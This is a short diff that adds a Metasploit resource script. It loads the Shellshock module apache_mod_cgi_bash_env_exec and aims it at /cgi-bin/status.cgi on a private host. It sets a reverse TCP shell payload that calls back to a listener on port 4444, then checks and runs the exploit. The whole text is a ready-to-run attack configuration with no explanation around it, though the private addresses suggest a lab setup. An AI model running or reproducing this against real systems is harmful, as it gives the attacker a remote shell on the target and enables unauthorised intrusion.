@@ -1,0 +1,10 @@
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOSTS 172.28.0.20
+set RPORT 80
+set TARGETURI /cgi-bin/status.cgi
+set TARGET 0
+set PAYLOAD generic/shell_reverse_tcp
+set LHOST 172.28.0.10
+set LPORT 4444
+check
+run
